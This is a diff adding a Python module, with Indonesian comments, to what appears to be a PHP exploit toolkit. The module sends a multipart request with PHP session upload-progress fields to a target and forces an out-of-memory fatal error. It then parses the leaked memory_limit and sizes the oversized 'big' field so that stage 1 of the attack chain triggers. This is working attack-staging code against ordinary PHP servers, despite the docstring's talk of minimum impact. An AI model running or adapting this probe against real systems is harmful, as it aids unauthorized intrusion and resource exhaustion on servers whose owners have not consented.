@@ -1,0 +1,172 @@
+"""lib/memprobe.py — baca `memory_limit` target lewat SATU request.
+
+Kenapa modul ini ada
+--------------------
+Rantai stage 1 (`_big_field`) mengirim field multipart sebesar `huge_mb`
+megabita. Field itu HARUS lebih besar dari `memory_limit` target, kalau tidak
+PHP tidak OOM dan seluruh rantai berhenti di tahap nol.
+
+Sebelum modul ini, nilainya hardcoded 12 MB dan operator harus menebak:
+
+    hugo_mb=12 -> 8M  : OOM (bagus)
+    huge_mb=12 -> 128M: TIDAK OOM, rantai mati tanpa penjelasan
+    huge_mb=12 -> 512M: TIDAK OOM, dan kita mengirim 12 MB sia-sia
+
+Dua kegagalan itu terlihat sama dari luar ("stage1 gagal"), padahal
+sebabnya berbeda dan biayanya beda. Menebak lebih besar (misal 256 MB)
+"menyelesaikan" masalah dengan mengirim ratusan MB ke target orang —
+lambat, mencurigakan di log, dan melanggar prinsip minimum-impact.
+
+Cara kerjanya
+-------------
+PHP menulis `memory_limit` ke dalam pesan fatal OOM:
+
+    Fatal error: Allowed memory size of 134217728 bytes exhausted
+    (tried to allocate 20480 bytes) in ...
+
+Nilai 134217728 = 128 MiB. Itu satu-satunya kebocoran yang kita butuhkan,
+dan muncul di respons biasa (kalau `display_errors=On`) atau di log.
+
+Yang membuat ini satu request: kita tidak perlu OOM dulu untuk membaca
+angkanya — kita kirim field multipart yang ukurannya sengaja melewati
+beberapa kandidat batas sekaligus, lalu parse angka dari pesan fatal.
+Kalau target memakai `display_errors=Off`, angkanya tidak muncul; probe
+mengembalikan `unknown` dan pemanggil memakai default konservatif.
+Tidak ada tebakan yang dipaksakan.
+
+Batas etis
+----------
+Probe ini mengirim satu request berukuran sekitar `probe_mb` dan berhenti.
+Tidak ada loop, tidak ada eskalasi ukuran otomatis, tidak ada retry
+tanpa batas. Kalau target tidak membocorkan angkanya, kita menyerah dan
+bilang "tidak diketahui" — bukan menyapu 256 MB sampai berhasil.
+"""
+
+from __future__ import annotations
+
+import re
+
+# Pesan fatal PHP, beberapa varian lintas versi:
+#   8.x : "Allowed memory size of 134217728 bytes exhausted (tried to allocate ...)"
+#   7.x : sama
+#   5.x : "Allowed memory size of 134217728 bytes exhausted (tried to allocate ...)"
+# Beberapa build memakai "Out of memory (allocated ...)" tanpa angka limit.
+_ALLOWED = re.compile(
+    rb"Allowed memory size of\s+(\d+)\s+bytes exhausted", re.IGNORECASE)
+_LIMIT_HDR = re.compile(
+    rb"memory_limit[^0-9]{0,40}(\d+)\s*([KMG]?)", re.IGNORECASE)
+
+_UNITS = {"": 1, b"": 1, "K": 1024, b"K": 1024,
+          "M": 1024 ** 2, b"M": 1024 ** 2,
+          "G": 1024 ** 3, b"G": 1024 ** 3}
+
+# Batas atas yang kita terima sebagai "masuk akal". Di atas ini, angka yang
+# terbaca hampir pasti artefak (mis. potongan Content-Length), bukan limit.
+_SANE_MAX = 8 * 1024 ** 3
+
+
+def parse_limit(resp: bytes) -> int | None:
+    """Ambil memory_limit (byte) dari respons. None kalau tidak terbocorkan."""
+    if not resp:
+        return None
+
+    m = _ALLOWED.search(resp)
+    if m:
+        try:
+            n = int(m.group(1))
+        except ValueError:
+            return None
+        if 0 < n <= _SANE_MAX:
+            return n
+
+    m = _LIMIT_HDR.search(resp)
+    if m:
+        try:
+            n = int(m.group(1))
+        except ValueError:
+            return None
+        unit = m.group(2).upper()
+        n *= _UNITS.get(unit, _UNITS.get(unit.decode(), 1))
+        if 0 < n <= _SANE_MAX:
+            return n
+
+    return None
+
+
+def huge_mb_for(limit_bytes: int | None, *, default_mb: int = 12,
+                headroom: float = 1.15, floor_add_mb: int = 2) -> int:
+    """Ukuran field `big` yang menjamin OOM, dalam MB.
+
+    Kenapa `floor_add_mb`, bukan persentase saja: pada limit 128 MiB,
+    headroom 15% berarti mengirim 148 MB — 20 MB terbuang hanya untuk
+    melewati batas. Yang dibutuhkan cuma beberapa MB di atas limit, cukup
+    untuk menutup selisih pembulatan alokasi. Jadi dipakai
+    `max(15%, +2 MB)` dan hasilnya dibulatkan ke atas.
+
+    Tanpa limit yang diketahui, pakai default (perilaku lama, tidak berubah).
+    """
+    if not limit_bytes or limit_bytes <= 0:
+        return default_mb
+    lim_mb = limit_bytes / (1024 ** 2)
+    mb = int(max(lim_mb * headroom, lim_mb + floor_add_mb))
+    # Batas atas 512 MB: di atas itu target hampir pasti punya limit tak
+    # terjangkau dan rantai tidak akan jalan — lebih baik berhenti dan
+    # melapor daripada mengirim setengah gigabyte.
+    return max(4, min(mb, 512))
+
+
+def fb_for(limit_bytes: int | None, *, default_mb: int = 12) -> int:
+    """Huge-mb yang dipakai rantai, dengan alasan yang bisa dicetak."""
+    return huge_mb_for(limit_bytes, default_mb=default_mb)
+
+
+def format_mb(n: int) -> str:
+    if n >= 1024 ** 2:
+        return f"{n / (1024 ** 2):.0f} MiB"
+    if n >= 1024:
+        return f"{n / 1024:.0f} KiB"
+    return f"{n} B"
+
+
+def describe(limit_bytes: int | None, chosen_mb: int) -> str:
+    """Satu baris penjelasan untuk preflight/verbose."""
+    if limit_bytes:
+        return (f"memory_limit {format_mb(limit_bytes)} terbaca dari target; "
+                f"field 'big' disetel {chosen_mb} MB (harus > limit)")
+    return (f"memory_limit tidak terbaca (display_errors mungkin Off); "
+            f"field 'big' pakai default {chosen_mb} MB")
+
+
+# ---------------------------------------------------------------- probe ---
+
+def probe(target_url: str, *, probe_mb: int = 16, timeout: float = 45.0,
+          verbose: bool = False) -> tuple[int | None, bytes]:
+    """Kirim SATU request multipart yang melewati memory_limit.
+
+    Mengembalikan (limit_bytes | None, body_respons). Tidak pernah melempar
+    untuk kegagalan jaringan biasa — pemanggil memutuskan apa artinya.
+    """
+    from .chain import Target, build_multipart
+
+    t = Target(target_url, timeout=timeout, verbose=False)
+    boundary = b"P2SMEMPROBE"
+    parts = [
+        {"name": "PHPSESSID", "data": b"p2s"},
+        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p2smem"},
+        {"name": "big", "data": b"B" * (probe_mb * 1024 * 1024)},
+    ]
+    body = build_multipart(parts, boundary)
+    try:
+        resp = t.post(body, boundary, read_cap=1 << 19,
+                      timeout=max(60.0, float(timeout)))
+    except OSError as e:
+        if verbose:
+            t.log(f"[!] probe gagal di jaringan: {e}")
+        return None, b""
+    limit = parse_limit(resp)
+    if verbose:
+        if limit:
+            t.log(f"[+] memory_limit terbaca: {format_mb(limit)}")
+        else:
+            t.log("[!] memory_limit tidak terbocorkan (display_errors Off?)")
+    return limit, resp
